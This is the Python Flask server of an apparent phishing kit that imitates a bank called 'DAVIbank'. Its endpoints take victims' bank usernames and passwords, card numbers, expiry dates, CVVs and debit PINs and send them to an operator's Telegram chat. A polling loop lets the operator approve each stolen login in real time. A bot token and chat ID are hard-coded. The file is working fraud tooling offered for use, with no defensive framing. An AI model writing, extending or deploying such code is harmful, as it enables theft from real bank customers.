from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
from datetime import datetime
import threading
import time

BOT_TOKEN = '8144392743:AAF0qG5TnvlhYcGZdlz7f3rwLpMBw3rXvqQ'
ADMIN_CHAT_ID = '6434195233'
PORT = 3000

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

pending_validations = {}
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0

@app.route('/api/submit', methods=['POST', 'OPTIONS'])
def submit_login():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    username = data.get('username')
    password = data.get('password')
    
    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username}")
    
    pending_validations[user_id] = {
        'username': username,
        'password': password,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }
    
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ VALIDAR ACCESO", "callback_data": f"validate_{user_id}"}
        ]]
    }
    
    message = (f"🔐 **NUEVA SOLICITUD DE ACCESO** 🔐\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🆔 ID: `{user_id}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"📋 **DATOS DE ACCESO**\n"
               f"👤 Usuario: {username}\n"
               f"🔑 Contraseña: {password}\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"⚠️ Presione el botón para validar este acceso")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/check/<user_id>', methods=['GET', 'OPTIONS'])
def check_validation(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in pending_validations:
        return jsonify({"validated": pending_validations[user_id]['status'] == 'validated'})
    return jsonify({"validated": False})

@app.route('/api/card', methods=['POST', 'OPTIONS'])
def submit_card():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    message = (f"💳 **DATOS DE TARJETA** 💳\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"👤 Usuario: {data.get('username')}\n"
               f"🔑 Contraseña: {data.get('password')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"💳 Tarjeta: {data.get('cardNumber')}\n"
               f"📅 Expira: {data.get('expiry')}\n"
               f"🔐 CVV: {data.get('cvv')}\n"
               f"🏧 PIN: {data.get('debitPin')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
    
    return jsonify({"success": True})

@app.route('/health', methods=['GET', 'OPTIONS'])
def health():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    return jsonify({"status": "ok", "pending": len(pending_validations)})

def poll_telegram():
    global last_update_id
    while True:
        try:
            url = f"{TELEGRAM_API}/getUpdates"
            params = {"timeout": 30}
            if last_update_id:
                params["offset"] = last_update_id + 1
            
            response = requests.get(url, params=params, timeout=35)
            updates = response.json()
            
            if updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id']
                    
                    if 'callback_query' in update:
                        callback = update['callback_query']
                        data = callback['data']
                        
                        if data.startswith('validate_'):
                            user_id = data.replace('validate_', '')
                            
                            if user_id in pending_validations:
                                pending_validations[user_id]['status'] = 'validated'
                                print(f"[{datetime.now()}] ✅ User validated: {user_id}")
                                
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "✅ Acceso validado!"})
                                
                                requests.post(f"{TELEGRAM_API}/sendMessage",
                                    json={"chat_id": ADMIN_CHAT_ID, "text": f"✅ Usuario {user_id} ha sido validado exitosamente"})
                    
                    if 'message' in update:
                        message = update['message']
                        chat_id = message['chat']['id']
                        text = message.get('text', '')
                        
                        if text == '/start':
                            welcome = ("🤖 Bot de validación DAVIbank\n\n"
                                      "Los usuarios serán notificados aquí cuando necesiten validación.\n\n"
                                      "Comandos:\n/status - Ver estado\n/pending - Ver pendientes")
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": welcome})
                        
                        elif text == '/status':
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": f"📊 Pendientes: {len(pending_validations)}"})
        
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

if __name__ == '__main__':
    print("\n" + "="*50)
    print("DAVIbank Bot Starting...")
    print("="*50)
    
    poll_thread = threading.Thread(target=poll_telegram, daemon=True)
    poll_thread.start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
